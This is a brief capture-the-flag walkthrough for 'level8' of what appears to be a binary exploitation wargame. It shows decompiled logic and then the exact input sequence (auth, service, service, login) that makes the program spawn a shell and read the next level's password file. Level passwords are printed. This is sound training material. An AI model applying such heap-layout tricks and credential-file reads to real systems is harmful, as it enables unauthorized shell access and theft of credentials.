# Level 8
*password : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9*

```
$ scp -P 4242 level8@192.168.56.108:level8 binary/
```

## Analyze

bool4 must be true

```
    while ((bool)bool3) {
      if (fd == 0) break;
      --fd;
      bool4 = *str_tmp < *cmp;
      bool3 = *str_tmp == *cmp;
      ++str_tmp;
      ++cmp;
    }
```

at the end of the loop str_tmp[i] must be < to cmp[i]

cmp = "login"
str = input

### Test

```
$ ./level8
login
Segmentation fault (core dumped)
```
condition pass


```
      if (auth[8] == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
```

auth[8] must be different to '\0'

### Test

```
$ ./level8
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
